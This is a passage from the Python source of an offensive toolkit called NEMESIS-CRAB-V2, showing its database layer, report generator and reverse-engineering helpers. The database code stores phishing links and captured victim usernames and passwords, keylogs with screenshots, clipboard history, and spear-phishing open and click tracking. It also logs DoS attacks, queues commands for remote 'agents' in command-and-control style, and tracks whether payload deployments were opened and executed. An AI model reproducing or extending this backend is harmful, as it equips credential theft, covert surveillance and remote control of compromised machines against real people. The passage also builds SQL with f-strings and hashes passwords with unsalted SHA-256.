                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            row = self.conn.execute(
                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            ip = socket.gethostbyname(domain)
            if ip:
                self.conn.execute(
                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
                    (domain, ip)
                )
                self.conn.commit()
                return ip
            return None
        except:
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_re_jobs'] = self.conn.execute("SELECT COUNT(*) FROM reverse_engineering_jobs").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_re_job(self, job_id: str, file_path: str, analysis_type: str, result: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO reverse_engineering_jobs (job_id, file_path, analysis_type, result)
                   VALUES (?, ?, ?, ?)""",
                (job_id, file_path, analysis_type, result[:10000])
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save RE job: {e}")
            return False
    
    def get_re_jobs(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM reverse_engineering_jobs ORDER BY created_at DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# REPORT GENERATOR
# =====================
class ReportGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def generate_pdf_report(self, analysis_data: Dict, target: str) -> str:
        """Generate PDF report from analysis data"""
        try:
            if not PDF_AVAILABLE:
                return None
            
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"nemesis_report_{target}_{timestamp}.pdf"
            report_path = os.path.join(REPORT_DIR, report_filename)
            
            doc = SimpleDocTemplate(
                report_path,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.HexColor('#1a73e8'),
                alignment=TA_CENTER,
                spaceAfter=30
            )
            
            story = []
            story.append(Paragraph("🦀 NEMESIS-CRAB-V2 Security Report", title_style))
            story.append(Paragraph(f"Target: {target}", styles['Heading2']))
            story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
            story.append(Spacer(1, 20))
            
            # Summary
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary_text = f"""
            This report presents a comprehensive security analysis of <b>{target}</b>.
            The analysis was performed using NEMESIS-CRAB-V2 v{VERSION}.
            """
            story.append(Paragraph(summary_text, styles['Normal']))
            story.append(Spacer(1, 12))
            
            # Analysis results
            for key, value in analysis_data.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
            
            # Footer
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by NEMESIS-CRAB-V2 v{VERSION} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            return report_path
        except Exception as e:
            logger.error(f"PDF report generation error: {e}")
            return None
    
    def generate_json_report(self, analysis_data: Dict, target: str) -> str:
        """Generate JSON report from analysis data"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"nemesis_report_{target}_{timestamp}.json"
            report_path = os.path.join(REPORT_DIR, report_filename)
            
            report_data = {
                'tool': NAME,
                'version': VERSION,
                'target': target,
                'timestamp': datetime.datetime.now().isoformat(),
                'analysis': analysis_data
            }
            
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            return report_path
        except Exception as e:
            logger.error(f"JSON report generation error: {e}")
            return None
    
    def generate_report(self, analysis_data: Dict, target: str) -> Dict[str, str]:
        """Generate both PDF and JSON reports"""
        reports = {}
        
        pdf_path = self.generate_pdf_report(analysis_data, target)
        if pdf_path:
            reports['pdf'] = pdf_path
        
        json_path = self.generate_json_report(analysis_data, target)
        if json_path:
            reports['json'] = json_path
        
        return reports

# =====================
# REVERSE ENGINEERING TOOLS
# =====================
class ReverseEngineeringTools:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.ghidra_path = config.get('reverse_engineering.ghidra_path', '')
        self.radare2_path = config.get('reverse_engineering.radare2_path', shutil.which('r2') or '')
        self.strings_min_length = config.get('reverse_engineering.strings_min_length', 4)
    
    def extract_strings(self, file_path: str, min_length: int = None) -> str:
        """Extract strings from a binary file"""
        min_length = min_length or self.strings_min_length
        job_id = str(uuid.uuid4())[:8]
        
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Extract ASCII strings
            ascii_strings = re.findall(rb'[ -~]{%d,}' % min_length, data)
            ascii_strings = [s.decode('ascii', errors='ignore') for s in ascii_strings]
            
            # Extract Unicode strings
            unicode_strings = re.findall(rb'(?:[\x20-\x7e]\x00){%d,}' % min_length, data)
            unicode_strings = [s.decode('utf-16-le', errors='ignore') for s in unicode_strings]
            
            result = "=== ASCII Strings ===\n"
            result += "\n".join(ascii_strings[:500])
            result += "\n\n=== Unicode Strings ===\n"
            result += "\n".join(unicode_strings[:500])
            
            # Save to database
            self.db.save_re_job(job_id, file_path, 'strings', result)
            
            # Save to file
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"strings_{job_id}.txt")
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def hex_dump(self, file_path: str, offset: int = 0, length: int = 256) -> str:
        """Generate hex dump of a file"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            with open(file_path, 'rb') as f:
                f.seek(offset)
                data = f.read(length)
            
            result = f"Hex dump of {file_path} (offset: {offset}, length: {length}):\n"
            result += "=" * 70 + "\n"
            
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part = ' '.join(f'{b:02x}' for b in chunk)
                ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                result += f"{offset + i:08x}  {hex_part:<48}  {ascii_part}\n"
            
            self.db.save_re_job(job_id, file_path, 'hexdump', result)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"hexdump_{job_id}.txt")
            with open(output_path, 'w') as f:
                f.write(result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def disassemble(self, file_path: str) -> str:
        """Disassemble a binary using radare2 or objdump"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            # Try radare2 first
            if self.radare2_path and shutil.which(self.radare2_path):
                cmd = [self.radare2_path, '-q', '-c', 'aa; pdf', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    output = result.stdout
                else:
                    output = result.stderr
            # Try objdump
            elif shutil.which('objdump'):
                cmd = ['objdump', '-d', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                output = result.stdout if result.returncode == 0 else result.stderr
            # Try gdb
            elif shutil.which('gdb'):
                cmd = ['gdb', '-batch', '-ex', 'disassemble', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                output = result.stdout if result.returncode == 0 else result.stderr
            else:
                output = "No disassembler available. Install radare2, objdump, or gdb."
            
            self.db.save_re_job(job_id, file_path, 'disassemble', output)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"disasm_{job_id}.txt")
            with open(output_path, 'w') as f:
                f.write(output)
            
            return output
        except Exception as e:
            return f"Error: {e}"
    
    def decompile(self, file_path: str) -> str:
        """Decompile a binary using available tools"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            # Try radare2
            if self.radare2_path and shutil.which(self.radare2_path):
                cmd = [self.radare2_path, '-q', '-c', 'aaa; pdc', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                output = result.stdout if result.returncode == 0 else result.stderr
            else:
                output = "No decompiler available. Install radare2 with decompiler plugins."
            
            self.db.save_re_job(job_id, file_path, 'decompile', output)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"decompiled_{job_id}.txt")
            with open(output_path, 'w') as f:
                f.write(output)
            
            return output
        except Exception as e:
            return f"Error: {e}"
    
    def decode_obfuscated(self, data: str, encoding: str = 'base64') -> str:
        """Decode obfuscated data"""
        try:
            if encoding.lower() == 'base64':
                return base64.b64decode(data).decode('utf-8', errors='ignore')
            elif encoding.lower() == 'hex':
                return bytes.fromhex(data).decode('utf-8', errors='ignore')
            elif encoding.lower() == 'rot13':
                import codecs
                return codecs.decode(data, 'rot_13')
            elif encoding.lower() == 'url':
                return urllib.parse.unquote(data)
            elif encoding.lower() == 'gzip':
                return gzip.decompress(base64.b64decode(data)).decode('utf-8', errors='ignore')
            elif encoding.lower() == 'zlib':
                return zlib.decompress(base64.b64decode(data)).decode('utf-8', errors='ignore')
            else:
                return f"Unsupported encoding: {encoding}"
        except Exception as e:
            return f"Error: {e}"
    
    def analyze_metadata(self, file_path: str) -> str:
        """Analyze file metadata"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            result = f"File Analysis: {file_path}\n"
            result += "=" * 50 + "\n"
            
            # File info
            stat = os.stat(file_path)
            result += f"Size: {stat.st_size} bytes\n"
            result += f"Created: {datetime.datetime.fromtimestamp(stat.st_ctime)}\n"
            result += f"Modified: {datetime.datetime.fromtimestamp(stat.st_mtime)}\n"
            result += f"Permissions: {oct(stat.st_mode)[-3:]}\n"
            
            # Check magic bytes
            with open(file_path, 'rb') as f:
                magic = f.read(4)
            
            magic_hex = binascii.hexlify(magic).decode()
            result += f"Magic bytes: {magic_hex}\n"
            
            # Determine file type
            file_types = {
                b'\x7fELF': 'ELF executable',
                b'MZ': 'PE executable (Windows)',
                b'PK\x03\x04': 'ZIP archive',
                b'\x1f\x8b': 'GZIP archive',
                b'%PDF': 'PDF document',
                b'\xff\xd8\xff': 'JPEG image',
                b'\x89PNG': 'PNG image',
                b'GIF8': 'GIF image',
            }
            
            detected_type = 'Unknown'
            for sig, name in file_types.items():
                if magic.startswith(sig):
                    detected_type = name
                    break
            
            result += f"Detected type: {detected_type}\n"
            
            # Calculate hashes
            result += "\nHashes:\n"
            with open(file_path, 'rb') as f:
                data = f.read()
            result += f"  MD5: {hashlib.md5(data).hexdigest()}\n"
            result += f"  SHA1: {hashlib.sha1(data).hexdigest()}\n"
            result += f"  SHA256: {hashlib.sha256(data).hexdigest()}\n"
            
            self.db.save_re_job(job_id, file_path, 'metadata', result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def extract_embedded(self, file_path: str) -> str:
        """Extract embedded files from archives"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            result = f"Extracting embedded files from: {file_path}\n"
            extract_dir = os.path.join(REVERSE_ENGINEERING_DIR, f"extract_{job_id}")
            os.makedirs(extract_dir, exist_ok=True)
            
            if zipfile.is_zipfile(file_path):
                with zipfile.ZipFile(file_path, 'r') as z:
                    z.extractall(extract_dir)
                    result += f"Extracted {len(z.namelist())} files from ZIP archive\n"
                    result += "\n".join(z.namelist())
            elif tarfile.is_tarfile(file_path):
